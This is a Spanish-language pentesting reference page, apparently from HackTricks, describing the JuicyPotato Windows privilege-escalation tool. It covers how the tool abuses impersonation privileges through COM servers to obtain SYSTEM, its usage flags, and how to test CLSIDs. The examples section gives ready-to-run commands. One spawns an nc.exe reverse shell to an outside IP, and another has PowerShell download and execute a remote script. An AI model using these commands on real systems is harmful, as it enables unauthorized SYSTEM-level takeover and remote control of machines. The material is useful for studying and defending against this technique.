# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) se pueden usar para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. _**Verifique:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir, **otra herramienta de escalada de privilegios locales, de cuentas de servicio de Windows a NT AUTHORITY\SYSTEM**_

#### Puedes descargar juicypotato de [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Resumen <a href="#summary" id="summary"></a>

[**Del Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [servicio](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) teniendo el oyente MiTM en `127.0.0.1:6666` y cuando tienes privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de la construcción de Windows encontramos una configuración donde `BITS` estaba intencionalmente deshabilitado y el puerto `6666` estaba ocupado.

Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Saluda a Juicy Potato**.

> Para la teoría, consulta [Rotten Potato - Escalada de Privilegios de Cuentas de Servicio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.

Descubrimos que, además de `BITS`, hay varios servidores COM que podemos abusar. Solo necesitan:

1. ser instanciables por el usuario actual, normalmente un “usuario de servicio” que tiene privilegios de suplantación
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrador, …)

Después de algunas pruebas, obtuvimos y probamos una lista extensa de [CLSID interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles jugosos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato te permite:

- **CLSID objetivo** _elige cualquier CLSID que desees._ [_Aquí_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por SO._
- **Puerto de escucha COM** _define el puerto de escucha COM que prefieras (en lugar del 6666 codificado en duro)_
- **Dirección IP de escucha COM** _vincula el servidor a cualquier IP_
- **Modo de creación de procesos** _dependiendo de los privilegios del usuario suplantado puedes elegir entre:_
- `CreateProcessWithToken` (necesita `SeImpersonate`)
- `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
- `ambos`
- **Proceso a lanzar** _lanzar un ejecutable o script si la explotación tiene éxito_
- **Argumento del proceso** _personaliza los argumentos del proceso lanzado_
- **Dirección del servidor RPC** _para un enfoque sigiloso puedes autenticarte en un servidor RPC externo_
- **Puerto del servidor RPC** _útil si deseas autenticarte en un servidor externo y el firewall está bloqueando el puerto `135`…_
- **MODO DE PRUEBA** _principalmente para fines de prueba, es decir, probando CLSIDs. Crea el DCOM e imprime el usuario del token. Ver_ [_aquí para pruebas_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Pensamientos finales <a href="#final-thoughts" id="final-thoughts"></a>

[**Del Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Si el usuario tiene privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.

Es casi imposible prevenir el abuso de todos estos Servidores COM. Podrías pensar en modificar los permisos de estos objetos a través de `DCOMCNFG`, pero buena suerte, esto va a ser un desafío.

La solución real es proteger cuentas y aplicaciones sensibles que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente inhibiría este exploit, pero podría tener un impacto serio en el sistema operativo subyacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Ejemplos

Nota: Visita [esta página](https://ohpe.it/juicy-potato/CLSID/) para una lista de CLSIDs para probar.

### Obtén un shell reverso de nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lanzar un nuevo CMD (si tienes acceso RDP)

![](<../../images/image (300).png>)

## Problemas de CLSID

A menudo, el CLSID predeterminado que utiliza JuicyPotato **no funciona** y el exploit falla. Por lo general, se necesitan múltiples intentos para encontrar un **CLSID funcional**. Para obtener una lista de CLSIDs para probar en un sistema operativo específico, debes visitar esta página:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verificando CLSIDs**

Primero, necesitarás algunos ejecutables además de juicypotato.exe.

Descarga [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) y cárgalo en tu sesión de PS, y descarga y ejecuta [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSIDs para probar.

Luego descarga [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (cambia la ruta a la lista de CLSID y al ejecutable de juicypotato) y ejecútalo. Comenzará a probar cada CLSID, y **cuando el número de puerto cambie, significará que el CLSID funcionó**.

**Verifica** los CLSIDs funcionales **usando el parámetro -c**

## Referencias

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
